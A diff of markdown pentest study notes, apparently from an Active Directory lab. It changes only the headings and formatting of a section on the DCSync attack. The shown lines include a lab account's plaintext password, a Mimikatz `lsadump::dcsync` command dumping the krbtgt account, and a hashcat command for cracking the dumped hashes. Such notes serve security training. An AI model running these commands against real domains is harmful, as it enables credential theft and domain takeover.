@@ -711,11 +711,9 @@ In prod envs, domains usually rely on multiple DC redundancies.
 - _Enterprise Admins_
 - _Administrators_ groups
 
-
 If we can access a user account in one of those groups, we can impersonate a DC and perform a *dsync* attack and request any creds from the domain
 
-
-##### Mimikatz
+##### Using Mimikatz
 
 - RDP into client75 as `jeffadmin:BrouhahaTungPerorateBroom2023!` & launch Mimikatz
 ```powershell
@@ -737,7 +735,8 @@ whoami /groups
 cd C:\Tools
 .\mimikatz.exe
 
-mimikatz # lsadump::dcsync /user:corp\krbtgt
+# mimikatz
+lsadump::dcsync /user:corp\krbtgt
 	[DC] 'corp.com' will be the domain
 	[DC] 'DC1.corp.com' will be the DC server
 	[DC] 'corp\krbtgt' will be the user account
@@ -766,8 +765,7 @@ mimikatz # lsadump::dcsync /user:corp\krbtgt
 hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-
-##### impacket
+##### Using impacket
 
 - In Kali
 ```bash
